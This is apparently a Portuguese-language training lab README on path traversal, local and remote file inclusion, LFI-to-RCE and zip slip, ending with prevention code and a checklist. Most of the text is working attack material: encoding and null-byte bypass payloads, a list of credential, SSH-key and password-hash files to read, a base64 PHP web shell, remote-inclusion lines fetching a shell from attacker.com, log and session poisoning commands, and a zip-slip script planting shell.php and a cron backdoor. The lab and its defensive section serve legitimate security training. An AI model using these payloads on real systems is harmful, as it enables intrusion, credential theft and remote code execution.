# 📁 Path Traversal / Directory Traversal - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟢 Iniciante → 🔴 Avançado
**Tempo estimado**: 3-4 horas
**Pontos**: 70 (10 + 25 + 35)

### O Que Você Vai Aprender

✅ Fundamentos de Path Traversal
✅ Directory listing e file disclosure
✅ Bypass de filtros (encoding, null bytes, etc.)
✅ Local File Inclusion (LFI)
✅ Remote File Inclusion (RFI)
✅ LFI to RCE (log poisoning, wrapper exploitation)
✅ Zip slip vulnerability

---

## 📖 Teoria Completa

### O Que É Path Traversal?

Path Traversal (também conhecido como Directory Traversal) é uma vulnerabilidade que permite acessar arquivos e diretórios fora do diretório previsto pela aplicação.

### Como Funciona?

#### Código Vulnerável Clássico

```python
# VULNERÁVEL ❌
import os

filename = request.args.get('file')
filepath = os.path.join('/var/www/files/', filename)

with open(filepath, 'r') as f:
    return f.read()
```

**Input normal:**
```
?file=document.pdf
Lê: /var/www/files/document.pdf
```

**Input malicioso:**
```
?file=../../../../etc/passwd
Lê: /var/www/files/../../../../etc/passwd
    = /etc/passwd
```

---

## 💣 Payloads Básicos

### 1. Path Traversal Simples

```bash
# Unix/Linux
../../../etc/passwd
../../../../etc/shadow
../../../../../../etc/hosts

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\boot.ini
```

### 2. Absolute Path

```bash
# Unix/Linux
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/proc/self/environ
/home/user/.ssh/id_rsa

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Users\Administrator\Desktop\flag.txt
```

---

## 🔓 Bypass de Filtros

### 1. Nested Traversal

Se filtro remove `../`:

```bash
....//....//....//etc/passwd
..././..././..././etc/passwd
```

Após sanitização: `../../../etc/passwd` ✓

### 2. URL Encoding

```bash
# Single encoding
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd
```

### 3. Unicode/UTF-8

```bash
# UTF-8
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Unicode
..%u002f..%u002f..%u002fetc%u002fpasswd
```

### 4. Null Byte Injection (PHP < 5.3)

```bash
# Adiciona extensão forçada
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Após null byte, resto é ignorado
```

### 5. Bypass de Extensão

Se aplicação força `.txt`:

```bash
file=../../../../etc/passwd  # Sem extensão
file=../../../../etc/passwd%00.txt  # Null byte
file=../../../../etc/passwd.txt  # Se permitir criação
```

### 6. Backslash vs Forward Slash

```bash
# Windows aceita ambos
..\..\..\..\windows\win.ini
../../../../windows/win.ini

# Mixing
..\../..\./../windows/win.ini
```

### 7. Bypass com Encoding Misto

```bash
..%5c..%5c..%5cwindows%5cwin.ini
..%2f..%5c..%2fetc%2fpasswd
```

---

## 📂 Arquivos Interessantes

### Linux/Unix

```bash
# Senhas e usuários
/etc/passwd              # Lista de usuários
/etc/shadow              # Hashes de senhas (requer root)
/etc/security/passwd     # AIX
/etc/security/user       # AIX

# Configuração SSH
/home/user/.ssh/id_rsa          # Chave privada SSH
/home/user/.ssh/id_rsa.pub      # Chave pública
/home/user/.ssh/authorized_keys # Chaves autorizadas
/root/.ssh/id_rsa               # Root SSH key

# Histórico de comandos
/home/user/.bash_history
/home/user/.zsh_history
/root/.bash_history

# Logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log               # Tentativas de login
/var/log/syslog

# Configurações de aplicação
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/var/www/html/.env              # Laravel, Node.js
/var/www/html/config.php        # WordPress, etc

# Proc filesystem
/proc/self/environ              # Variáveis de ambiente
/proc/self/cmdline              # Linha de comando do processo
/proc/self/fd/N                 # File descriptors
/proc/version                   # Kernel version
/proc/net/tcp                   # Conexões TCP
```

### Windows

```bash
# System files
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System.ini
C:\boot.ini

# User data
C:\Users\Administrator\Desktop\flag.txt
C:\Users\Administrator\Documents\
C:\Users\user\AppData\Roaming\

# Logs
C:\Windows\System32\config\SAM         # Hashes de senha
C:\Windows\System32\config\SYSTEM
C:\inetpub\logs\LogFiles\W3SVC1\       # IIS logs

# Configurações
C:\inetpub\wwwroot\web.config           # ASP.NET
C:\xampp\htdocs\config.php
```

---

## 🔥 Local File Inclusion (LFI)

### Conceito

LFI permite incluir arquivos locais do servidor no código executado.

```php
<?php
// VULNERÁVEL ❌
$page = $_GET['page'];
include($page . '.php');
?>
```

### Exploitation

```bash
# Include /etc/passwd
?page=../../../../etc/passwd

# Null byte bypass (PHP < 5.3)
?page=../../../../etc/passwd%00

# PHP wrapper - Base64
?page=php://filter/convert.base64-encode/resource=/etc/passwd

# Data wrapper
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
# Decodifica para: <?php system($_GET['c']); ?>
```

### PHP Wrappers

```php
# php://filter - Read source code
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=/etc/passwd

# php://input - RCE via POST
POST data: <?php system($_GET['c']); ?>
URL: ?page=php://input&c=id

# data:// - RCE
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==

# expect:// - RCE (requer extensão)
expect://id

# phar:// - Upload + LFI
Upload file.phar com PHP
?page=phar://uploads/file.phar/shell.php
```

---

## 🌐 Remote File Inclusion (RFI)

### Conceito

RFI permite incluir arquivos de servidores remotos.

```php
<?php
// VULNERÁVEL ❌
include($_GET['page']);
?>
```

### Exploitation

```bash
# Include remote shell
?page=http://attacker.com/shell.txt

# FTP
?page=ftp://attacker.com/shell.txt

# SMB (Windows)
?page=\\attacker.com\share\shell.txt
```

### Bypass allow_url_include

```bash
# Se allow_url_include = Off

# Use SMB (Windows)
?page=\\attacker.com\share\shell.txt

# Use phar://
?page=phar://http://attacker.com/file.phar

# Use zip://
Upload malicious.zip
?page=zip://uploads/malicious.zip#shell.php
```

---

## 💥 LFI to RCE

### 1. Log Poisoning

#### Apache/Nginx Access Log

```bash
# 1. Inject PHP code via User-Agent
curl -A "<?php system(\$_GET['c']); ?>" http://target.com/

# 2. Include log file
?page=../../../../var/log/apache2/access.log&c=id

# Ou via Referer, Cookie, etc
```

#### SSH Log

```bash
# 1. SSH com username malicioso
ssh '<?php system($_GET["c"]); ?>'@target.com

# 2. Include auth.log
?page=../../../../var/log/auth.log&c=id
```

### 2. Session File Poisoning

```php
# 1. Set session variable com PHP code
POST /login
username=<?php system($_GET['c']); ?>

# 2. Include session file
?page=../../../../var/lib/php/sessions/sess_[SESSION_ID]&c=id
```

### 3. /proc/self/environ

```bash
# 1. Inject via User-Agent
User-Agent: <?php system($_GET['c']); ?>

# 2. Include environ
?page=../../../../proc/self/environ&c=id
```

### 4. Mail Log

```bash
# 1. Send email with PHP code
mail -s "<?php system(\$_GET['c']); ?>" root@localhost < /dev/null

# 2. Include mail log
?page=../../../../var/mail/www-data&c=id
```

### 5. Upload + LFI

```bash
# 1. Upload file (image com PHP)
image.jpg:
\xFF\xD8\xFF\xE0<?php system($_GET['c']); ?>

# 2. Include uploaded file
?page=../../../../var/www/uploads/image.jpg&c=id
```

---

## 📦 Zip Slip

### O Que É?

Vulnerabilidade ao extrair arquivos ZIP/TAR que contêm paths com `../`.

### Código Vulnerável

```python
# VULNERÁVEL ❌
import zipfile

with zipfile.ZipFile('upload.zip', 'r') as zip:
    zip.extractall('/var/www/uploads/')
```

### Exploitation

```python
# Criar ZIP malicioso
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as z:
    # Arquivo vai para /var/www/html/ (fora de uploads/)
    z.write('shell.php', '../../../var/www/html/shell.php')
```

### Impact

```bash
# Sobrescrever arquivos críticos
../../../etc/cron.d/backdoor
../../../var/www/html/index.php
../../../home/user/.ssh/authorized_keys
```

---

## 🏗️ Estrutura do Laboratório

### 1. 🟢 Basic App (10 pontos)
- **Porta**: 5060
- **Cenário**: File Download System
- Path traversal direto sem filtros
- Access a /etc/passwd

### 2. 🟡 Intermediate App (25 pontos)
- **Porta**: 5061
- **Cenário**: Image Gallery
- Filtros bypassáveis
- LFI exploitation
- Log poisoning

### 3. 🔴 Advanced App (35 pontos)
- **Porta**: 5062
- **Cenário**: CMS com Upload
- Zip slip
- LFI to RCE
- Multiple bypass required

---

## 🛡️ Prevenção

### 1. Whitelist de Arquivos (MELHOR)

```python
ALLOWED_FILES = {
    'report1': '/var/www/reports/monthly.pdf',
    'report2': '/var/www/reports/quarterly.pdf',
}

file_id = request.args.get('file')
if file_id not in ALLOWED_FILES:
    abort(403)

filepath = ALLOWED_FILES[file_id]
```

### 2. Validação Estrita de Path

```python
from pathlib import Path

def safe_join(base_dir, filename):
    # Resolve symlinks e normaliza
    base = Path(base_dir).resolve()
    target = (base / filename).resolve()

    # Verifica se está dentro do diretório base
    if not target.is_relative_to(base):
        raise ValueError("Path traversal detected!")

    return target
```

### 3. Desabilitar Null Bytes

```python
if '\x00' in filename or '%00' in filename:
    raise ValueError("Null byte detected!")
```

### 4. Zip Extraction Segura

```python
import zipfile
from pathlib import Path

def safe_extract(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as z:
        for member in z.namelist():
            # Normaliza path
            target_path = (Path(extract_to) / member).resolve()

            # Verifica se está dentro do diretório
            if not target_path.is_relative_to(Path(extract_to).resolve()):
                raise ValueError(f"Zip slip detected: {member}")

        z.extractall(extract_to)
```

---

## 📝 Checklist

- [ ] Entendi Path Traversal
- [ ] Acessei /etc/passwd
- [ ] Bypassei filtro com encoding
- [ ] Bypassei filtro com nested traversal
- [ ] Explorei LFI
- [ ] Testei PHP wrappers
- [ ] Realizei log poisoning
- [ ] Explorei Zip slip
- [ ] Obtive RCE via LFI

**Total**: 70 pontos

---

**Próximo Lab**: [07 - CSRF →](../07-csrf/README.md)

---

**Boa sorte! 📁**
